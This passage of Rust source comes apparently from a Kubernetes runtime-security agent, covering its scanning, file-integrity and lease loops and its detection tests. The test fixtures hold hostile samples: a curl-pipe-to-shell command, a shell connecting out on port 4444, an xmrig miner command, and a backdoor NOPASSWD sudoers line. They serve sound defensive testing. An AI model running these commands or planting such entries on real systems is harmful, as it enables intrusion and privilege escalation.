                let cancel = Arc::new(AtomicBool::new(false));
                ctx.full_scan(cancel).await;
                let secs = ctx.policy().scan.interval_secs.max(60);
                tokio::select! {
                    () = tokio::time::sleep(Duration::from_secs(secs)) => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    {
        let ctx = ctx.clone();
        let mut shutdown = shutdown.clone();
        tokio::spawn(async move {
            let mut baseline = integrity::load(&ctx.state);
            let (rt_tx, mut rt_rx) = mpsc::channel::<Vec<String>>(64);
            let mut watcher = RealtimeWatcher::default();
            ctx.integrity(&mut baseline, None).await;
            let mut next = tokio::time::Instant::now();
            loop {
                let p = ctx.policy().integrity;
                watcher.sync(&ctx.proc.host_root(), &p, &rt_tx);
                if next <= tokio::time::Instant::now() {
                    next =
                        tokio::time::Instant::now() + Duration::from_secs(p.interval_secs.max(10));
                }
                tokio::select! {
                    () = tokio::time::sleep_until(next) => {
                        ctx.integrity(&mut baseline, None).await;
                    }
                    Some(mut paths) = rt_rx.recv() => {
                        let settle = tokio::time::Instant::now() + REALTIME_SETTLE;
                        while let Ok(Some(more)) = tokio::time::timeout_at(settle, rt_rx.recv()).await {
                            paths.extend(more);
                        }
                        paths.sort();
                        paths.dedup();
                        ctx.integrity(&mut baseline, Some(paths)).await;
                    }
                    _ = shutdown.changed() => {
                        watcher.stop();
                        return;
                    }
                }
            }
        });
    }

    {
        let ctx = ctx.clone();
        let mut shutdown = shutdown.clone();
        tokio::spawn(async move {
            tokio::select! {
                () = tokio::time::sleep(FIRST_FULL_SCAN) => {}
                _ = shutdown.changed() => return,
            }
            let mut reported = HashSet::new();
            loop {
                ctx.rootcheck(&mut reported).await;
                let secs = ctx.policy().rootcheck.interval_secs.max(600);
                tokio::select! {
                    () = tokio::time::sleep(Duration::from_secs(secs)) => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    if let Some(client) = kube {
        let mut shutdown = shutdown.clone();
        let (store, counters, policy) = (store.clone(), counters.clone(), policy_rx.clone());
        let (node, ns, instance) = (
            args.node.clone(),
            args.namespace.clone(),
            args.instance.clone(),
        );
        tokio::spawn(async move {
            loop {
                let status = AgentStatus {
                    node: node.clone(),
                    version: env!("CARGO_PKG_VERSION").into(),
                    event_source: mode.clone(),
                    policy_revision: policy.borrow().revision(),
                    content_digest: store.active(),
                    content_error: store.error(),
                    detections: counters.total(),
                    detections_by_content: counters.by_content(),
                    started_at: Some(started),
                };
                if let Err(e) =
                    apply_lease(&client, &ns, &status.lease(&instance, Utc::now())).await
                {
                    tracing::warn!(error = %e, "write agent lease");
                }
                tokio::select! {
                    () = tokio::time::sleep(LEASE_EVERY) => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    health.set_ready(true);
    tracing::info!(node = %args.node, "agent running");
    crate::observability::stopped(shutdown).await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use prometheus_client::registry::Registry;

    use super::procfs::tests::{CID, FakeProc};
    use super::*;
    use crate::content::tests::eicar;

    fn ctx(
        fake: &FakeProc,
        state: &Path,
        policy: Policy,
    ) -> (Arc<Ctx>, mpsc::Receiver<(Detection, String)>) {
        let (tx, rx) = mpsc::channel(64);
        let (_ptx, prx) = watch::channel(policy);
        let ctx = Arc::new(Ctx {
            node: "node-a".into(),
            proc: fake.fs(),
            state: state.to_path_buf(),
            policy: prx,
            store: Arc::new(ContentStore::new(state)),
            table: Mutex::new(ProcessTable::default()),
            pods: pods::PodIndex::empty(),
            blocker: Some(Arc::new(response::tests::FakeBlocker::default())),
            inodes: None,
            whodata: Mutex::new(whodata::Whodata::default()),
            integrity_since: Mutex::new(None),
            cache: Mutex::new(ScanCache::default()),
            own: Mutex::new(HashSet::new()),
            metrics: AgentMetrics::register(&mut Registry::default()),
            tx,
        });
        (ctx, rx)
    }

    fn drain(rx: &mut mpsc::Receiver<(Detection, String)>) -> Vec<Detection> {
        let mut out = Vec::new();
        while let Ok((d, _)) = rx.try_recv() {
            out.push(d);
        }
        out
    }

    #[tokio::test]
    async fn exec_events_raise_behavior_and_signature_detections() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(
            10,
            1,
            "java",
            "elf",
            "java -jar app.jar",
            &format!("0::/kubepods/pod1/{CID}"),
        );
        fake.add(
            11,
            10,
            "sh",
            "elf",
            "sh -c curl http://x | sh",
            &format!("0::/kubepods/pod1/{CID}"),
        );
        fake.add(
            12,
            1,
            "x",
            std::str::from_utf8(&eicar()).unwrap(),
            "x",
            "0::/",
        );
        let mut policy = Policy::default();
        policy.behavior.enabled = true;
        policy.scan.on_exec = true;
        policy.scan.max_file_size_bytes = 1 << 20;
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        for pid in [10, 11, 12] {
            ctx.handle(ProcessEvent::Exec(Exec {
                pid,
                ..Exec::default()
            }))
            .await;
        }
        let d = drain(&mut rx);
        let rules: Vec<&str> = d.iter().map(|d| d.rule.as_str()).collect();
        assert!(rules.contains(&"webserver-shell"), "{rules:?}");
        assert!(rules.contains(&"pipe-to-shell"), "{rules:?}");
        assert!(rules.contains(&"Ward.Test.EICAR"), "{rules:?}");
        let shell = d.iter().find(|d| d.rule == "pipe-to-shell").unwrap();
        assert_eq!(shell.workload.as_ref().unwrap().container_id, CID);
        assert_eq!(
            shell.process.as_ref().unwrap().storyline,
            vec!["10:java", "1:?"]
        );
        assert!(
            d.iter().all(|d| d.actions == vec![Response::Alert]),
            "detect mode only alerts"
        );

        ctx.handle(ProcessEvent::Exit { pid: 11 }).await;
        assert!(ctx.table.lock().unwrap().get(11).is_none());
    }

    #[tokio::test]
    async fn connect_blocked_and_exclusions() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(20, 1, "bash", "elf", "bash", "0::/");
        fake.add(21, 1, "bash", "elf", "bash", "0::/");
        let mut policy = Policy::default();
        policy.behavior.enabled = true;
        policy.exclusions.processes = vec!["/opt/ignored".into()];
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        ctx.handle(ProcessEvent::Connect {
            pid: 20,
            uid: 0,
            comm: "bash".into(),
            addr: "10.0.0.1".parse().unwrap(),
            port: 4444,
        })
        .await;
        ctx.handle(ProcessEvent::Blocked {
            pid: 21,
            uid: 0,
            comm: "bad".into(),
            dev: 1,
            ino: 2,
            denied: true,
        })
        .await;
        let d = drain(&mut rx);
        assert_eq!(d[0].rule, "shell-network-connect");
        assert!(d[0].description.contains("10.0.0.1:4444"));
        assert_eq!(d[1].rule, "exec-blocked");
        assert_eq!(d[1].actions, vec![Response::Block]);

        ctx.own.lock().unwrap().insert(20);
        ctx.handle(ProcessEvent::Connect {
            pid: 20,
            uid: 0,
            comm: "bash".into(),
            addr: "10.0.0.1".parse().unwrap(),
            port: 1,
        })
        .await;
        assert!(drain(&mut rx).is_empty());
    }

    #[tokio::test]
    async fn protect_mode_kills_and_reports_errors() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        // Above any pid_max, so the kill can never reach a real process.
        let pid = i32::MAX - 1;
        fake.add(
            pid,
            1,
            "xmrig",
            "elf",
            "xmrig -o stratum+tcp://pool",
            "0::/",
        );
        let mut policy = Policy {
            mode: crate::crd::Mode::Protect,
            ..Policy::default()
        };
        policy.behavior.enabled = true;
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        ctx.handle(ProcessEvent::Exec(Exec {
            pid,
            ..Exec::default()
        }))
        .await;
        let d = drain(&mut rx);
        let miner = d.iter().find(|d| d.rule == "crypto-miner").unwrap();
        assert!(miner.actions.contains(&Response::Kill));
        assert!(
            miner.action_error.is_some(),
            "the pid is not a real process"
        );
    }

    #[tokio::test]
    async fn full_scan_and_integrity() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(1, 0, "init", "elf", "init", "0::/");
        fake.add(
            40,
            1,
            "app",
            "elf",
            "app",
            &format!("0::/kubepods/pod1/{CID}"),
        );
        let root = fake.dir.path().join("40/root");
        std::fs::create_dir_all(root.join("srv")).unwrap();
        std::fs::write(root.join("srv/eicar.com"), eicar()).unwrap();
        let host = fake.dir.path().join("1/root/etc");
        std::fs::create_dir_all(&host).unwrap();
        std::fs::write(host.join("shadow"), "root:x").unwrap();
        let mut policy = Policy::default();
        policy.scan.max_file_size_bytes = 1 << 20;
        policy.integrity.enabled = true;
        policy.integrity.paths = vec!["/etc/shadow".into()];
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        ctx.handle(ProcessEvent::Exec(Exec {
            pid: 40,
            ..Exec::default()
        }))
        .await;
        drain(&mut rx);
        assert_eq!(ctx.scan_roots(&ctx.policy()).len(), 1);
        ctx.full_scan(Arc::new(AtomicBool::new(false))).await;
        let d = drain(&mut rx);
        assert_eq!(d.len(), 1);
        assert_eq!(d[0].file.as_ref().unwrap().path, "/srv/eicar.com");

        let mut baseline = None;
        ctx.integrity(&mut baseline, None).await;
        assert!(drain(&mut rx).is_empty());
        std::fs::write(host.join("shadow"), "root:x\nevil:x").unwrap();
        ctx.integrity(&mut baseline, None).await;
        let d = drain(&mut rx);
        assert_eq!(d[0].rule, "file-integrity");
        assert_eq!(d[0].severity, Severity::High);
        let changes = d[0].changes.as_ref().unwrap();
        assert_eq!(changes.mode, "scheduled");
        assert!(changes.diff.is_none(), "shadow is in noDiff");
        assert!(integrity::load(state.path()).is_some());
    }

    #[tokio::test]
    async fn integrity_reports_diff_attributes_and_whodata() {
        use std::os::unix::fs::MetadataExt as _;
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(1, 0, "init", "elf", "init", "0::/");
        fake.add(77, 1, "vi", "/usr/bin/vi", "vi /etc/sudoers", "0::/");
        let etc = fake.dir.path().join("1/root/etc");
        std::fs::create_dir_all(&etc).unwrap();
        std::fs::write(etc.join("sudoers"), "root ALL=(ALL) ALL\n").unwrap();
        let mut policy = Policy::default();
        policy.integrity.enabled = true;
        policy.integrity.paths = vec!["/etc/sudoers".into(), "/etc/dropped".into()];
        policy.integrity.report_changes = true;
        policy.integrity.whodata = true;
        policy.integrity.recursion_level = 4;
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        let mut baseline = None;
        ctx.integrity(&mut baseline, None).await;
        assert!(drain(&mut rx).is_empty());

        let meta = std::fs::metadata(etc.join("sudoers")).unwrap();
        ctx.handle(ProcessEvent::Fim(events::Fim {
            pid: 77,
            uid: 0,
            comm: "vi".into(),
            op: ward_ebpf_common::FIM_WRITE,
            dev: scanner::kernel_dev(meta.dev()),
            ino: meta.ino(),
            name: String::new(),
        }))
        .await;
        std::fs::write(
            etc.join("sudoers"),
            "root ALL=(ALL) ALL\nevil ALL=(ALL) NOPASSWD: ALL\n",
        )
        .unwrap();
        let dir = std::fs::metadata(&etc).unwrap();
        ctx.handle(ProcessEvent::Fim(events::Fim {
            pid: 78,
            uid: 1000,
            comm: "sh".into(),
            op: ward_ebpf_common::FIM_CREATE,
            dev: scanner::kernel_dev(dir.dev()),
            ino: dir.ino(),
            name: "dropped".into(),
        }))
        .await;
        std::fs::write(etc.join("dropped"), "x").unwrap();
        ctx.integrity(
            &mut baseline,
            Some(vec!["/etc/sudoers".into(), "/etc/dropped".into()]),
        )
        .await;
        let mut d = drain(&mut rx);
        d.sort_by(|a, b| {
            a.file
                .as_ref()
                .unwrap()
                .path
                .cmp(&b.file.as_ref().unwrap().path)
        });
        assert_eq!(d.len(), 2, "{d:?}");
        let created = &d[0];
        assert_eq!(created.process.as_ref().unwrap().comm, "sh");
        assert_eq!(created.process.as_ref().unwrap().uid, Some(1000));
        assert_eq!(
            created.changes.as_ref().unwrap().operation.as_deref(),
            Some("create")
        );
        let modified = &d[1];
        assert_eq!(modified.severity, Severity::High);
        assert!(
            modified.description.contains("by vi (pid 77, uid 0)"),
            "{}",
            modified.description
        );
        let changes = modified.changes.as_ref().unwrap();
        assert_eq!(changes.mode, "realtime");
        assert_eq!(changes.operation.as_deref(), Some("write"));
        assert!(changes.attributes.contains(&"sha256".to_string()));
        assert!(
            changes
                .diff
                .as_deref()
                .unwrap()
                .contains("+evil ALL=(ALL) NOPASSWD: ALL"),
            "{changes:?}"
        );

        let mut off = ctx.policy();
        off.integrity.whodata = false;
        assert!(integrity_limits(&off.integrity).file_limit > 0);
        let mut w = RealtimeWatcher::default();
        let (tx, _rx) = mpsc::channel(1);
        off.integrity.realtime = false;
        w.sync(Path::new("/nonexistent"), &off.integrity, &tx);
        assert!(w.running.is_none());
        off.integrity.realtime = true;
        w.sync(Path::new("/nonexistent"), &off.integrity, &tx);
        assert!(w.running.is_some());
        w.stop();
        assert!(w.running.is_none());
    }

    #[tokio::test]
    async fn procfs_poller_reports_new_and_gone() {
        let fake = FakeProc::new();
        fake.add(50, 1, "a", "elf", "a", "0::/");
        let (tx, mut rx) = mpsc::channel(16);
        let mut p = Policy::default();
        p.behavior.poll_interval_ms = 100;
        let (_ptx, prx) = watch::channel(p);
        let (stop_tx, stop_rx) = watch::channel(false);
        let task = tokio::spawn(poll_procfs(fake.fs(), tx, prx, stop_rx));
        let first = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .unwrap()
            .unwrap();
        assert!(matches!(first, ProcessEvent::Exec(Exec { pid: 50, .. })));
        let link = fake.dir.path().join("50/exe");
        std::fs::remove_file(&link).unwrap();
        std::os::unix::fs::symlink("/tmp/other", &link).unwrap();
        let reexec = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .unwrap()
            .unwrap();
        assert!(
            matches!(reexec, ProcessEvent::Exec(Exec { pid: 50, .. })),
            "an exec in the same PID is reported"
        );
        std::fs::remove_dir_all(fake.dir.path().join("50")).unwrap();
        let gone = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(gone, ProcessEvent::Exit { pid: 50 });
        stop_tx.send(true).unwrap();
        task.await.unwrap();
        assert_eq!(
            read_json::<Policy>(Path::new("/nonexistent")),
            Policy::default()
        );
    }
}
